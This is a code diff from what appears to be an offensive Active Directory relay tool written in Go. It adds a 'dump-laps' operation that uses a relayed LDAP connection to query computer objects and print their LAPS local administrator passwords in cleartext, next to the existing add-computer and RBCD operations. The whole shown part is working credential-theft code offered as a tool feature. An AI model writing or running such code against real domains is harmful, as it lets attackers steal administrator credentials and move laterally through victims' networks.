@@ -358,8 +358,10 @@ func executeLDAPRelayOperation(rawConn net.Conn, ops ldapRelayOps, isTLS bool) (
 		return ldapRelayAddComputer(ldapConn, ops.opTarget)
 	case "rbcd":
 		return ldapRelaySetRBCD(ldapConn, ops.opTarget, ops.opValue)
+	case "dump-laps":
+		return ldapRelayDumpLAPS(ldapConn, ops.opTarget)
 	default:
-		return fmt.Sprintf("unknown operation: %s (available: whoami, add-computer, rbcd)", ops.operation)
+		return fmt.Sprintf("unknown operation: %s (available: whoami, add-computer, rbcd, dump-laps)", ops.operation)
 	}
 }
 
@@ -498,6 +500,56 @@ func ldapRelayDiscoverBaseDN(conn *ldap.Conn) (string, error) {
 		return "", fmt.Errorf("defaultNamingContext not found in rootDSE")
 	}
 	return dn, nil
+}
+
+func ldapRelayDumpLAPS(conn *ldap.Conn, filter string) string {
+	baseDN, err := ldapRelayDiscoverBaseDN(conn)
+	if err != nil {
+		return fmt.Sprintf("dump-laps: discover base DN: %v", err)
+	}
+
+	lapsFilter := "(&(objectClass=computer)(|(ms-Mcs-AdmPwd=*)(ms-LAPS-Password=*)(ms-LAPS-EncryptedPassword=*)))"
+	if filter != "" {
+		lapsFilter = fmt.Sprintf("(&(objectClass=computer)(sAMAccountName=*%s*)(|(ms-Mcs-AdmPwd=*)(ms-LAPS-Password=*)(ms-LAPS-EncryptedPassword=*)))", ldap.EscapeFilter(filter))
+	}
+
+	sr, err := conn.Search(ldap.NewSearchRequest(
+		baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 100, 30, false,
+		lapsFilter,
+		[]string{"sAMAccountName", "dNSHostName", "ms-Mcs-AdmPwd", "ms-LAPS-Password"},
+		nil))
+	if err != nil {
+		return fmt.Sprintf("dump-laps: search failed: %v", err)
+	}
+
+	if len(sr.Entries) == 0 {
+		return "dump-laps: no computers with readable LAPS passwords found"
+	}
+
+	var results []string
+	for _, entry := range sr.Entries {
+		name := entry.GetAttributeValue("sAMAccountName")
+		fqdn := entry.GetAttributeValue("dNSHostName")
+		v1Pass := entry.GetAttributeValue("ms-Mcs-AdmPwd")
+		v2Pass := entry.GetAttributeValue("ms-LAPS-Password")
+
+		host := name
+		if fqdn != "" {
+			host = fqdn
+		}
+
+		if v1Pass != "" {
+			results = append(results, fmt.Sprintf("%s: %s (LAPSv1)", host, v1Pass))
+		}
+		if v2Pass != "" {
+			results = append(results, fmt.Sprintf("%s: %s (LAPSv2)", host, v2Pass))
+		}
+	}
+
+	if len(results) == 0 {
+		return "dump-laps: LAPS attributes exist but passwords not readable (insufficient permissions)"
+	}
+	return fmt.Sprintf("dump-laps SUCCESS: %d passwords\n%s", len(results), strings.Join(results, "\n"))
 }
 
 func ldapRelayDNToDomain(baseDN string) string {
